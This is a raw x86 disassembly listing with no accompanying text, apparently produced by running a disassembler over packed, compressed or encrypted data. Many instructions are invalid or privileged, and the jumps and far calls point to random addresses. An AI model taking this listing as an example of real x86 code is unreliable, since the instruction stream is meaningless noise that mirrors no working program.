  43d124:	sbb    BYTE PTR [esi],al
  43d126:	xor    ah,BYTE PTR [ebp+0x7b]
  43d129:	xor    DWORD PTR [edx+0x77],edi
  43d12c:	dec    edi
  43d12d:	je     0x43d17f
  43d12f:	mov    dh,0xd2
  43d131:	xor    BYTE PTR [eax-0x28],al
  43d134:	imul   ebx,DWORD PTR [edi-0x23],0xffffffb6
  43d138:	imul   edi,edx,0x36938b66
  43d13e:	nop
  43d13f:	mov    ch,0x3
  43d141:	mov    dl,0x38
  43d143:	(bad)  
  43d144:	fs pop edx
  43d146:	test   eax,0x8531a2fa
  43d14b:	out    0x2,eax
  43d14d:	bound  edi,QWORD PTR [ebx+esi*4-0x26]
  43d151:	out    0xc,eax
  43d153:	add    al,0xf9
  43d155:	lods   eax,DWORD PTR ds:[esi]
  43d156:	jle    0x43d19b
  43d158:	out    dx,al
  43d159:	push   cs
  43d15a:	pop    edx
  43d15b:	push   edx
  43d15c:	xlat   BYTE PTR ds:[ebx]
  43d15d:	xor    DWORD PTR [eax+0x6a],ebx
  43d160:	(bad)  
  43d161:	test   al,0x93
  43d163:	adc    BYTE PTR [eax],dh
  43d165:	xor    eax,0x51edb0a9
  43d16a:	hlt    
  43d16b:	push   edx
  43d16c:	add    esp,DWORD PTR [esi-0x659343ab]
  43d172:	mov    dh,0x51
  43d174:	push   esp
  43d175:	pop    es
  43d176:	jp     0x43d0fe
  43d178:	adc    DWORD PTR [edi-0x2b],eax
  43d17b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d17c:	shl    BYTE PTR [ebx-0x4c305001],1
  43d182:	shr    DWORD PTR [edx+edx*1],cl
  43d185:	retf   0x61c7
  43d188:	inc    ecx
  43d189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d18a:	and    esi,eax
  43d18c:	sahf   
  43d18d:	add    eax,0x27fb729c
  43d192:	sbb    DWORD PTR [esi],0x5fbbf301
  43d198:	(bad)  
  43d199:	ss test al,0xbb
  43d19c:	cli    
  43d19d:	mov    dh,0x48
  43d19f:	mov    al,0xcf
  43d1a1:	mov    ds:0xcefcff84,eax
  43d1a6:	scas   al,BYTE PTR es:[edi]
  43d1a7:	inc    esp
  43d1a8:	add    al,BYTE PTR [eax]
  43d1aa:	ds nop
  43d1ac:	sub    al,0x2a
  43d1af:	add    esp,DWORD PTR [eax-0x31a3b5de]
  43d1b5:	mov    dl,0x61
  43d1b7:	aaa    
  43d1b8:	in     al,0xe1
  43d1ba:	repz aaa 
  43d1bc:	xchg   esp,eax
  43d1bd:	or     BYTE PTR [esi],bh
  43d1bf:	jge    0xaf7c1569
  43d1c5:	scas   al,BYTE PTR es:[edi]
  43d1c6:	sub    DWORD PTR [edx+0x51],ebp
  43d1c9:	lock mov ecx,0x3d6cf609
  43d1cf:	cmp    al,BYTE PTR [edi]
  43d1d1:	mov    esi,0xd8fc5990
  43d1d6:	cmp    al,0x1a
  43d1d8:	jae    0x43d167
  43d1da:	xchg   edi,eax
  43d1db:	outs   dx,DWORD PTR ds:[esi]
  43d1dc:	mov    al,ds:0x9673d16f
  43d1e1:	push   eax
  43d1e2:	jge    0x43d215
  43d1e4:	ins    BYTE PTR es:[edi],dx
  43d1e5:	jae    0x43d1dc
  43d1e7:	push   0x45
  43d1e9:	test   DWORD PTR [eax],esi
  43d1eb:	iret   
  43d1ec:	mov    esi,0x532dfd28
  43d1f1:	and    ebx,ecx
  43d1f3:	add    BYTE PTR ds:0x9adc04df,bl
  43d1f9:	out    dx,eax
  43d1fa:	mov    ebp,DWORD PTR [esi]
  43d1fc:	add    cl,al
  43d1fe:	iret   
  43d1ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d200:	mov    al,ds:0x968e5b01
  43d205:	call   0x3802:0x4e7a7313
  43d20c:	shl    DWORD PTR [esi-0x63],cl
  43d20f:	rcl    BYTE PTR [esi+0x59a15a38],0xff
  43d216:	add    eax,0x5bc4b397
  43d21b:	and    DWORD PTR [edx+0x4e25ff4d],ebp
  43d221:	jl     0x43d265
  43d223:	lds    ebx,FWORD PTR [edx]
  43d225:	jmp    0x8f5f:0x5ed1a407
  43d22c:	ds stos DWORD PTR es:[edi],eax
  43d22e:	add    DWORD PTR [edx+eax*4],esp
  43d231:	jns    0x43d2ae
  43d233:	cmp    BYTE PTR [edx+ebx*4],ch
  43d236:	in     al,0xd0
  43d238:	test   BYTE PTR [edx+eiz*2+0x6ed06bf2],dh
  43d23f:	xchg   BYTE PTR [ecx],dh
  43d241:	push   ebx
  43d242:	inc    edx
  43d243:	jge    0x43d237
  43d245:	fcomp  DWORD PTR [edx]
  43d247:	push   cs
  43d248:	leave  
  43d249:	dec    edi
  43d24a:	mov    edx,0xc70402cf
  43d24f:	ja     0x43d228
  43d251:	stc    
  43d252:	xchg   DWORD PTR gs:[edi+0x2348d85c],ebp
  43d259:	mov    esi,0x79aab78d
  43d25e:	xor    al,0x5
  43d260:	sub    al,0x29
  43d262:	sbb    DWORD PTR [ecx+edi*1],esi
  43d265:	out    0x41,al
  43d267:	xor    edi,DWORD PTR [ecx+eax*8-0x4ae5ff26]
  43d26e:	(bad)  
  43d26f:	lahf   
  43d270:	jmp    0xa702:0x47ff2f73
  43d277:	fdiv   QWORD PTR [eax+0x22]
  43d27a:	cld    
  43d27b:	call   0x1466062e
  43d280:	mov    DWORD PTR [ebp-0x14],esp
  43d283:	add    BYTE PTR ds:0x758d4023,dh
  43d289:	sbb    ch,BYTE PTR [edx]
  43d28b:	mov    ah,BYTE PTR [ecx-0x357c589]
  43d291:	add    eax,0xa88f72ba
  43d296:	int    0x3e
  43d298:	push   cs
  43d299:	ficom  DWORD PTR [eax-0x79]
  43d29c:	fs pop ebx
  43d29e:	add    DWORD PTR [ebx],eax
  43d2a0:	cmp    eax,0x86a1f469
  43d2a5:	daa    
  43d2a6:	ins    BYTE PTR es:[edi],dx
  43d2a7:	mov    eax,ds:0x7d7e8821
  43d2ac:	and    al,0x4
  43d2ae:	fcomp  DWORD PTR [edi]
  43d2b0:	aam    0x14
  43d2b2:	mov    dl,0x75
  43d2b4:	mov    bl,0x3a
  43d2b6:	ja     0x43d30a
  43d2b8:	imul   DWORD PTR [ebx-0x6c2e4fb8]
  43d2be:	stos   DWORD PTR es:[edi],eax
  43d2bf:	(bad)  [bx-0x43f8]
  43d2c4:	push   esp
  43d2c5:	mov    WORD PTR [esi],ss
  43d2c7:	dec    edx
  43d2c8:	xchg   ecx,eax
  43d2c9:	cmp    DWORD PTR [ebp+edi*2-0x25],ecx
  43d2cd:	nop
  43d2ce:	or     bl,0xa
  43d2d1:	xchg   edi,eax
  43d2d2:	pop    edi
  43d2d3:	pop    ds
  43d2d4:	inc    edx
  43d2d5:	retf   0x8574
  43d2d8:	xor    ebx,DWORD PTR [eax]
  43d2da:	mov    esp,0x7df7c30b
  43d2df:	push   edx
  43d2e0:	aas    
  43d2e1:	cmc    
  43d2e2:	inc    eax
  43d2e3:	jmp    0xbf19:0xbd88267d
  43d2ea:	push   esp
  43d2eb:	mov    eax,0x34285d1a
  43d2f0:	adc    ecx,DWORD PTR [ecx]
  43d2f2:	daa    
  43d2f3:	sbb    al,BYTE PTR [ebp-0x14c050eb]
  43d2f9:	xchg   ecx,eax
  43d2fa:	ins    DWORD PTR es:[edi],dx
  43d2fb:	or     eax,DWORD PTR [esp+esi*4+0x1c05d0a4]
  43d302:	jle    0x43d2c2
  43d304:	mov    ecx,0x5dd82d0b
  43d309:	leave  
  43d30a:	mov    esp,0x95a35349
  43d30f:	stos   DWORD PTR es:[edi],eax
  43d310:	in     al,dx
  43d311:	cmp    DWORD PTR [ebp-0x31a5164c],edi
  43d317:	ret    
  43d318:	sar    BYTE PTR ss:[eax+0x577c1531],cl
  43d31f:	jae    0x43d304
  43d321:	scas   al,BYTE PTR es:[edi]
  43d322:	pop    ss
  43d323:	sub    esp,DWORD PTR [ecx+0x73]
  43d326:	imul   DWORD PTR [edx]
  43d328:	(bad)  
  43d329:	sub    DWORD PTR gs:[edi-0x47cb1d60],0x256a8cfb
  43d334:	xchg   edi,edx
  43d336:	pop    ebp
  43d337:	dec    ebx
  43d338:	stos   DWORD PTR es:[edi],eax
  43d339:	push   es
  43d33a:	xchg   ebp,eax
  43d33b:	retf   0x6d37
  43d33e:	push   esp
  43d33f:	pop    eax
  43d340:	call   0xee51fcfa
  43d345:	or     esi,DWORD PTR [edi]
  43d347:	mov    eax,ds:0x9af9665d
  43d34c:	fistp  QWORD PTR [ecx+0x50]
  43d34f:	jg     0x43d35d
  43d351:	pop    es
  43d352:	dec    ecx
  43d353:	test   BYTE PTR [eax-0x2a],bl
  43d356:	mov    dh,0x72
  43d358:	mov    bl,0xf0
  43d35a:	inc    dh
  43d35c:	mov    eax,ds:0x3fc761ff
  43d361:	or     eax,DWORD PTR [ebx+0xf7e07ea]
  43d367:	or     al,0x4
  43d369:	xchg   ebx,eax
  43d36a:	test   BYTE PTR [edx+0x486aacb1],cl
  43d370:	imul   eax,DWORD PTR [ebp-0x1dab27d8],0xffffffac
  43d377:	shl    BYTE PTR [ebp+0x694f452e],0x57
  43d37e:	dec    ebp
  43d37f:	pop    ebx
  43d380:	mov    dh,0xc9
  43d382:	jecxz  0x43d326
  43d384:	or     BYTE PTR ss:[ebx+0x3b],bh
  43d388:	(bad)  
  43d38a:	xchg   BYTE PTR [eax+0x1],al
  43d38d:	cmc    
  43d38e:	fs jmp 0x43d40a
  43d391:	mov    ecx,0x7162c110
  43d396:	icebp  
  43d397:	call   0x2effc2cf
  43d39c:	push   eax
  43d39d:	fsubr  QWORD PTR [ebp-0x47]
  43d3a0:	ins    BYTE PTR es:[edi],dx
  43d3a1:	xlat   BYTE PTR ds:[ebx]
  43d3a2:	and    BYTE PTR [eax+0x75],0x4f
  43d3a6:	(bad)  
  43d3a8:	cwde   
  43d3a9:	mov    bl,0xbc
  43d3ab:	int    0xc7
  43d3ad:	or     DWORD PTR [ecx+0x32e4b535],esi
  43d3b3:	daa    
  43d3b4:	adc    eax,0x75e8cfe6
  43d3b9:	inc    ebp
  43d3ba:	call   0xe652fd8
  43d3bf:	bndstx [esi+0x2],bnd2
  43d3c3:	out    dx,al
  43d3c4:	add    eax,0x6177fb85
  43d3c9:	fs aaa 
  43d3cb:	int    0x88
  43d3cd:	data16 jg 0x43d412
  43d3d0:	xor    al,0x56
  43d3d2:	test   al,0x44
  43d3d4:	test   al,0x43
  43d3d7:	ds jnp 0x43d37d
  43d3da:	sub    al,0x81
  43d3dc:	and    al,0x88
  43d3de:	push   ebp
  43d3df:	idiv   BYTE PTR [ecx]
  43d3e1:	dec    BYTE PTR cs:[ebx-0xf]
  43d3e5:	inc    edi
  43d3e6:	sub    BYTE PTR [edx+0xd6f368c],dl
  43d3ec:	stc    
  43d3ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d3ee:	sbb    BYTE PTR [edi-0x6e82f79f],bh
  43d3f4:	jmp    0x43d3fc
  43d3f6:	mov    dl,BYTE PTR [esi]
  43d3f8:	call   0x88fa:0xda46ff70
  43d3ff:	mov    esi,0x1102ba03
  43d404:	test   eax,0x1b023810
  43d409:	mov    cl,ch
  43d40b:	fbld   TBYTE PTR [esi]
  43d40d:	inc    esi
  43d40e:	call   0xfb0b:0xd7ef6bc7
  43d415:	mov    ds:0x51cd372d,eax
  43d41a:	push   cs
  43d41b:	call   0xef15514a
  43d420:	push   ss
  43d421:	das    
  43d422:	mov    esi,0x68af5688
  43d427:	les    eax,FWORD PTR [edx+0x2028fb86]
  43d42d:	xor    al,0x86
  43d42f:	(bad)  
  43d430:	mov    ebp,0xfd384050
  43d435:	xchg   BYTE PTR [ecx],ah
  43d437:	fbstp  TBYTE PTR [ebx-0x2d987f42]
  43d43d:	mov    ebx,0xb303fbe6
  43d442:	add    bl,BYTE PTR [ebx+0x5671318]
  43d448:	je     0x43d4ae
  43d44a:	retf   0x2050
  43d44d:	int3   
  43d44e:	mov    al,ds:0xdd8c25e9
  43d453:	push   esp
  43d454:	lock sahf 
  43d456:	mov    ds:0x58155713,eax
  43d45b:	lds    ebx,FWORD PTR [ebx-0x41]
  43d45e:	xchg   ecx,eax
  43d45f:	sub    DWORD PTR [edi],ebp
  43d461:	mov    ds:0xe3a6ddff,eax
  43d466:	jge    0x43d45e
  43d468:	sub    ah,BYTE PTR [edx+edi*8-0x5]
  43d46c:	(bad)  
  43d46d:	imul   ebp,DWORD PTR [esi+esi*1+0x2353da8c],0xe
  43d475:	xor    bh,BYTE PTR [esi]
  43d477:	jge    0x43d4de
  43d479:	pop    edi
  43d47a:	shl    DWORD PTR [eax],1
  43d47c:	sub    al,0xa2
  43d47e:	dec    edi
  43d47f:	ins    DWORD PTR es:[edi],dx
  43d480:	(bad)  
  43d481:	popa   
  43d482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d483:	cmp    DWORD PTR [eax],ebp
  43d485:	inc    edi
  43d486:	jmp    0x8830:0x4a81c9e
  43d48d:	or     eax,0xe5294862
  43d492:	cs enter 0x3133,0xa8
  43d497:	push   cs
  43d498:	hlt    
  43d499:	sub    ch,dl
  43d49b:	mov    eax,ds:0x5b545b9b
  43d4a0:	mov    al,ds:0x93a2253f
  43d4a5:	js     0x43d487
  43d4a7:	mov    WORD PTR [eax],cs
  43d4a9:	cmp    BYTE PTR [esi+0x473cddb],ch
  43d4af:	ret    
  43d4b0:	aas    
  43d4b1:	out    dx,eax
  43d4b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d4b3:	sub    BYTE PTR [esi],dh
  43d4b5:	dec    edi
  43d4b6:	sbb    ebp,ebp
  43d4b8:	mov    cl,0xd1
  43d4ba:	int3   
  43d4bb:	dec    edi
  43d4bc:	mov    ebx,ss
  43d4be:	int3   
  43d4bf:	push   ds
  43d4c0:	test   bh,ah
  43d4c2:	test   ebx,edx
  43d4c4:	ret    0x5c95
  43d4c7:	inc    ecx
  43d4c8:	ret    0x6566
  43d4cb:	adc    eax,0xc68a38e9
  43d4d0:	push   0x6e
  43d4d2:	sbb    esi,DWORD PTR [ebp-0x574eb1c0]
  43d4d8:	jo     0x43d4a1
  43d4da:	dec    ebp
  43d4db:	jnp    0x43d47b
  43d4dd:	add    eax,0x7e506fc5
  43d4e2:	arpl   WORD PTR [edx-0x5c],bx
  43d4e5:	test   esi,0x16c6191b
  43d4eb:	pop    es
  43d4ec:	mov    ah,0x8
  43d4ee:	jge    0x43d503
  43d4f0:	inc    edx
  43d4f1:	push   eax
  43d4f2:	push   ds
  43d4f3:	in     al,0xb6
  43d4f5:	sbb    cl,ah
  43d4f7:	mov    ds:0xc42ac4a8,eax
  43d4fc:	(bad)  
  43d4fd:	and    bl,dl
  43d4ff:	lea    esp,[ecx+0x7f06974b]
  43d505:	out    0x57,eax
  43d507:	push   edx
  43d508:	out    0xea,al
  43d50a:	pop    es
  43d50b:	mov    bl,0xe5
  43d50d:	mov    ds:0x3d0d9022,al
  43d512:	js     0x43d534
  43d514:	cmp    BYTE PTR [edx+0x76],0xba
  43d518:	(bad)  
  43d519:	push   ebx
  43d51a:	mov    bl,0xe0
  43d51c:	or     al,BYTE PTR [esi]
  43d51e:	repz and BYTE PTR [eax-0x27],ah
  43d522:	adc    esi,DWORD PTR [edx+0x5633228e]
  43d528:	xchg   DWORD PTR [ecx+0x16f80657],ebp
  43d52e:	fidivr WORD PTR [ebx]
  43d530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d531:	pushf  
  43d532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d533:	js     0x43d568
  43d535:	mov    cl,0x45
  43d537:	test   al,0x7e
  43d539:	mov    ch,0x26
  43d53c:	cmp    DWORD PTR [eax],eax
  43d53e:	ss ds sti 
  43d541:	aad    0xe1
  43d543:	mov    ah,0xae
  43d545:	mov    ds:0x9da614f,eax
  43d54a:	(bad)  
  43d54b:	fbld   TBYTE PTR [edx+ebx*8+0x895e673]
  43d552:	push   ebx
  43d553:	sbb    BYTE PTR [esi],dh
  43d555:	pop    esp
  43d556:	or     al,0x5b
  43d558:	clc    
  43d559:	bound  esi,QWORD PTR [edi+0x5afdef76]
  43d55f:	sti    
  43d560:	jg     0x43d597
  43d562:	sar    DWORD PTR [esi-0x5b],cl
  43d565:	retf   0x9938
  43d568:	jns    0x43d50d
  43d56a:	jp     0x43d51e
  43d56c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d56d:	fwait
  43d56e:	cli    
  43d56f:	outs   dx,BYTE PTR ds:[esi]
  43d570:	gs stos DWORD PTR es:[edi],eax
  43d572:	scas   al,BYTE PTR es:[edi]
  43d573:	jmp    0x21a9fbdb
  43d578:	cdq    
  43d579:	test   al,0x7c
  43d57b:	or     eax,0x54d3c458
  43d580:	push   cs
  43d581:	aaa    
  43d582:	aam    0x78
  43d584:	push   ebx
  43d585:	mov    ecx,0x3997f6e0
  43d58a:	inc    bp
  43d58c:	mov    ebp,DWORD PTR [ecx]
  43d58e:	or     BYTE PTR [ebx+0x67],cl
  43d591:	rcr    BYTE PTR [ebp-0x2e0926b2],1
  43d597:	adc    eax,0x3146a8ce
  43d59c:	xchg   edx,eax
  43d59d:	mov    esp,0xb9acfb79
  43d5a2:	and    eax,0xb123c64b
  43d5a7:	in     eax,0x8b
  43d5a9:	loope  0x43d533
  43d5ab:	sbb    eax,0x5c29febd
  43d5b0:	sub    al,0x14
  43d5b2:	xor    esi,DWORD PTR [ebx]
  43d5b4:	shl    DWORD PTR ss:[ebx-0x72],cl
  43d5b8:	xor    eax,0xa8d92e64
  43d5bd:	int    0x4e
  43d5bf:	in     al,dx
  43d5c0:	add    esp,DWORD PTR [ecx]
  43d5c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d5c3:	mov    al,ds:0xf49ddc31
  43d5c8:	dec    esp
  43d5c9:	data16 mov al,ds:0x4c8963fe
  43d5cf:	fst    QWORD PTR [ebx+0x42]
  43d5d2:	sbb    BYTE PTR [esi-0x778e6964],al
  43d5d8:	mov    al,0xff
  43d5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d5db:	mov    al,0x8f
  43d5dd:	retf   
  43d5de:	pushf  
  43d5df:	retf   0x5d57
  43d5e2:	daa    
  43d5e3:	ret    
  43d5e4:	pop    ds
  43d5e5:	in     eax,dx
  43d5e6:	sub    BYTE PTR [ebx+0x34],ah
  43d5e9:	lods   eax,DWORD PTR cs:[esi]
  43d5eb:	fild   QWORD PTR [ebp+0x7106a4c2]
  43d5f1:	outs   dx,DWORD PTR ss:[esi]
  43d5f3:	mov    bh,0x64
  43d5f5:	and    ch,bh
  43d5f7:	cmp    al,0xb3
  43d5f9:	xor    ebp,esp
  43d5fb:	pop    ebx
  43d5fc:	fsubrp st(6),st
  43d5fe:	jno    0x43d625
  43d600:	and    BYTE PTR ds:0x2994b078,al
  43d606:	fld    DWORD PTR [esp+ebx*8]
  43d609:	push   0x5f0b518
  43d60e:	or     dh,BYTE PTR [eax+0x2d535fb5]
  43d614:	sub    edx,edx
  43d616:	mov    ah,0x13
  43d618:	ins    BYTE PTR es:[edi],dx
  43d619:	popf   
  43d61a:	and    eax,0xaa85d4a3
  43d61f:	popa   
  43d620:	aas    
  43d621:	mov    esp,0xa4c435b4
  43d626:	js     0x43d62b
  43d628:	daa    
  43d629:	jmp    0xe719:0xc5496a4
  43d630:	ins    DWORD PTR es:[edi],dx
  43d631:	dec    edx
  43d632:	sti    
  43d633:	xor    al,0x86
  43d635:	iret   
  43d636:	inc    ecx
  43d637:	xor    esp,ebx
  43d639:	out    0x38,al
  43d63b:	je     0x43d609
  43d63d:	ins    BYTE PTR es:[edi],dx
  43d63e:	pusha  
  43d63f:	inc    esi
  43d640:	imul   edi,DWORD PTR [ebp-0x63237f8e],0x889a01ff
  43d64a:	xchg   edi,eax
  43d64b:	test   DWORD PTR [ebx-0x5ef1bd73],edi
  43d651:	std    
  43d652:	cmp    cl,BYTE PTR [edx]
  43d654:	fs leave 
  43d656:	pop    es
  43d657:	and    eax,0x4c7a601a
  43d65c:	popa   
  43d65d:	mov    esi,0x1d6aacad
  43d662:	or     al,0xf1
  43d664:	push   cs
  43d665:	pusha  
  43d666:	xchg   edi,eax
  43d667:	sahf   
  43d668:	xchg   edx,eax
  43d669:	test   BYTE PTR [eax],0x5e
  43d66c:	inc    esp
  43d66d:	aam    0xca
  43d66f:	fiadd  WORD PTR [ebx]
  43d671:	and    DWORD PTR [ecx],edi
  43d673:	sbb    BYTE PTR [ecx],ch
  43d675:	push   esi
  43d676:	dec    esi
  43d677:	push   cs
  43d678:	call   0x20fb398
  43d67d:	push   esp
  43d67e:	arpl   WORD PTR [ebp-0x22],bp
  43d681:	out    0x23,eax
  43d683:	daa    
  43d684:	int3   
  43d685:	pop    ss
  43d686:	leave  
  43d687:	sbb    al,0x1c
  43d689:	(bad)  
  43d68a:	and    al,0x8
  43d68c:	or     eax,0x31fe45e4
  43d691:	stos   DWORD PTR es:[edi],eax
  43d692:	imul   ebp,DWORD PTR [esi],0xffffffee
  43d695:	inc    esi
  43d696:	loope  0x43d65e
  43d698:	push   esi
  43d699:	out    dx,al
  43d69a:	clc    
  43d69b:	push   0x77a10489
  43d6a0:	or     al,0x19
  43d6a2:	inc    edi
  43d6a3:	stos   DWORD PTR es:[edi],eax
  43d6a4:	xor    ah,bh
  43d6a6:	mov    cl,BYTE PTR [ecx+0x2e]
  43d6a9:	inc    esi
  43d6aa:	mov    dh,0x1e
  43d6ac:	jns    0x43d62e
  43d6ae:	les    ebx,FWORD PTR [esi-0x19]
  43d6b1:	nop
  43d6b2:	inc    edx
  43d6b3:	icebp  
  43d6b4:	lds    esp,FWORD PTR [edi]
  43d6b6:	mov    dh,0xec
  43d6b8:	mov    ecx,0xf15f8135
  43d6bd:	scas   al,BYTE PTR es:[edi]
  43d6be:	push   0x1f
  43d6c0:	fimul  DWORD PTR [ecx+ebx*2+0x6b7cd083]
  43d6c7:	cmp    ch,BYTE PTR [ecx-0x1e]
  43d6ca:	fnsave [ebp+0x7d]
  43d6cd:	(bad)  
  43d6ce:	repz xor al,0xe
  43d6d1:	pusha  
  43d6d2:	push   ecx
  43d6d3:	sbb    dl,dh
  43d6d5:	test   BYTE PTR [edi+edi*2+0x1ce5979e],al
  43d6dc:	pop    edx
  43d6dd:	js     0x43d75c
  43d6df:	les    ebx,FWORD PTR [eax]
  43d6e1:	add    al,0x24
  43d6e3:	fcom   QWORD PTR [edi+0x671fb38a]
  43d6e9:	fs push ss
  43d6eb:	xor    ch,BYTE PTR [ebx]
  43d6ed:	(bad)
  43d6f1:	mov    ebp,0xad742608
  43d6f6:	inc    esi
  43d6f7:	fst    DWORD PTR [ebx-0x7b]
  43d6fa:	push   esp
  43d6fb:	pusha  
  43d6fc:	(bad)  
  43d6fd:	outs   dx,BYTE PTR ds:[esi]
  43d6fe:	jg     0x43d6af
  43d700:	mov    al,ds:0xf35322d0
  43d705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d706:	add    eax,DWORD PTR [eax+edi*4-0x73]
  43d70a:	aas    
  43d70b:	add    al,ch
  43d70d:	dec    edx
  43d70e:	popa   
  43d70f:	xchg   ebx,eax
  43d710:	xchg   ecx,eax
  43d711:	mov    esi,0x40897de3
  43d716:	mov    esp,0x1e24e53c
  43d71b:	std    
  43d71c:	add    al,0xee
  43d71e:	sub    BYTE PTR [edi+0x22],bh
  43d721:	repnz xor DWORD PTR [esi-0x6b],ecx
  43d725:	mov    eax,0xc88d1d29
  43d72a:	aam    0xd8
  43d72c:	stos   BYTE PTR es:[edi],al
  43d72d:	and    edi,DWORD PTR [ebx]
  43d72f:	(bad)  
  43d730:	retf   
  43d731:	cmp    esi,DWORD PTR [ecx]
  43d733:	jecxz  0x43d6ff
  43d735:	aam    0x37
  43d737:	test   eax,0x77028ab0
  43d73c:	sub    eax,0xb9c18811
  43d741:	shl    esp,1
  43d743:	sti    
  43d744:	ucomiss xmm2,DWORD PTR [ecx+ebp*8+0x76]
  43d749:	mov    dl,0x41
  43d74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d74c:	(bad)  
  43d74d:	cld    
  43d74e:	imul   eax,DWORD PTR [esi-0x4],0xffffff9c
  43d752:	sar    DWORD PTR [ebx-0x5a396554],cl
  43d758:	and    al,0x8b
  43d75a:	ins    BYTE PTR es:[edi],dx
  43d75b:	and    dh,bl
  43d75d:	dec    esi
  43d75e:	out    dx,eax
  43d75f:	xchg   ebx,eax
  43d760:	inc    edx
  43d761:	jb     0x43d72d
  43d763:	jle    0x43d76e
  43d765:	imul   ebx,ebp,0x59
  43d768:	sbb    bl,BYTE PTR [ebp-0x33]
  43d76b:	pop    ebx
  43d76c:	neg    BYTE PTR [ecx+0x5f]
  43d76f:	cmp    BYTE PTR [edi],bh
  43d771:	fsub   QWORD PTR [eax]
  43d773:	imul   eax,ebp,0x8
  43d776:	sub    eax,0xb7112b05
  43d77b:	aad    0xeb
  43d77d:	shl    DWORD PTR [eax+0x29],cl
  43d780:	cwde   
  43d781:	jp     0x43d7bd
  43d783:	mov    al,ds:0x512fe231
  43d788:	aad    0x62
  43d78a:	mov    al,0x9f
  43d78c:	mov    dh,BYTE PTR [ebp+ecx*2-0x72dd7d8f]
  43d793:	out    dx,al
  43d794:	leave  
  43d795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d796:	mov    ecx,0xd0bb3dc6
  43d79b:	out    0x2d,al
  43d79d:	adc    dh,bl
  43d79f:	dec    eax
  43d7a0:	or     bh,BYTE PTR [edx]
  43d7a2:	jnp    0x43d772
  43d7a4:	inc    ecx
  43d7a5:	mov    ch,0x4b
  43d7a7:	out    dx,eax
  43d7a8:	mov    ebp,0xbbb3a185
  43d7ad:	or     BYTE PTR [ecx+0x7a5a3d1f],ch
  43d7b3:	inc    ebx
  43d7b4:	lds    ebp,FWORD PTR [edi]
  43d7b6:	mov    ch,0xa5
  43d7b8:	mov    al,0x6a
  43d7ba:	jo     0x43d761
  43d7bc:	sub    BYTE PTR [eax],ah
  43d7be:	out    dx,al
  43d7bf:	fstp   QWORD PTR [esi+edx*8+0x1]
  43d7c3:	dec    ebp
  43d7c4:	add    BYTE PTR [ecx],ch
  43d7c6:	dec    esp
  43d7c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d7c8:	mov    DWORD PTR [edi],ebx
  43d7ca:	push   0x6554e4a5
  43d7cf:	xchg   esi,eax
  43d7d0:	adc    ch,BYTE PTR [ecx+ebx*4]
  43d7d3:	or     al,0x1a
  43d7d5:	adc    DWORD PTR ds:0xfaa799ee,0x1
  43d7dc:	test   BYTE PTR [ebp+0x35852a6d],cl
  43d7e2:	loop   0x43d84f
  43d7e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d7e5:	fbstp  TBYTE PTR [ebx]
  43d7e7:	(bad)  
  43d7e8:	dec    ebx
  43d7e9:	lds    ebp,FWORD PTR [edx-0xadd6cc5]
  43d7ef:	test   al,0x4b
  43d7f1:	lods   al,BYTE PTR ds:[esi]
  43d7f2:	sub    esp,esp
  43d7f4:	inc    ecx
  43d7f5:	out    dx,eax
  43d7f6:	cmp    eax,0xaccf088c
  43d7fb:	mov    ebx,0x53313a99
  43d800:	inc    ecx
  43d801:	mov    DWORD PTR [ebx],ebx
  43d803:	and    DWORD PTR [edi+0x75989dc2],0xf10a0308
  43d80d:	push   eax
  43d80e:	mov    cl,0x4e
  43d810:	jno    0x43d86f
  43d812:	stos   BYTE PTR es:[edi],al
  43d813:	cmp    al,0xdf
  43d815:	stos   DWORD PTR es:[edi],eax
  43d816:	ret    0xf7b1
  43d819:	lods   al,BYTE PTR ds:[esi]
  43d81a:	stos   BYTE PTR es:[edi],al
  43d81b:	cmp    BYTE PTR [edi+0x7],ch
  43d81e:	iret   
  43d81f:	and    esp,DWORD PTR [ebx-0x2a]
  43d822:	xchg   BYTE PTR [eax],bl
  43d824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d825:	out    0x62,eax
  43d827:	jmp    0x4e2c:0xd00ee1a4
  43d82e:	fisttp DWORD PTR [ebx-0x62220c90]
  43d834:	scas   eax,DWORD PTR es:[edi]
  43d835:	xchg   edi,eax
  43d836:	arpl   WORD PTR [esi-0x44be9ec3],dx
  43d83c:	pop    ecx
  43d83d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d83e:	sub    dl,ch
  43d840:	pop    ecx
  43d841:	arpl   WORD PTR [eax-0x3d],ax
  43d844:	aaa    
  43d845:	inc    BYTE PTR ds:0x1f12b180
  43d84b:	sbb    bh,BYTE PTR [ebp-0x13]
  43d84e:	cmp    al,0xff
  43d850:	mov    al,ds:0x74f926cd
  43d855:	sub    al,0xb2
  43d857:	addr16 inc ecx
  43d859:	js     0x43d879
  43d85b:	pop    edi
  43d85c:	hlt    
  43d85d:	out    dx,eax
  43d85e:	fisubr DWORD PTR [ecx+0x6f153563]
  43d864:	push   esi
  43d865:	in     al,dx
  43d866:	call   0xec3c8a17
  43d86b:	shl    BYTE PTR [edi+0x7b],cl
  43d86e:	xchg   edi,eax
  43d86f:	dec    eax
  43d870:	xor    BYTE PTR [eax],bl
  43d872:	xchg   ecx,eax
  43d873:	inc    esp
  43d874:	xor    DWORD PTR [ebp+eax*1-0x26878b84],edx
  43d87b:	in     al,0xd8
  43d87d:	push   es
  43d87e:	pushf  
  43d87f:	inc    eax
  43d880:	push   ds
  43d881:	popa   
  43d882:	loopne 0x43d8c9
  43d884:	jecxz  0x43d82d
  43d886:	sahf   
  43d887:	dec    esi
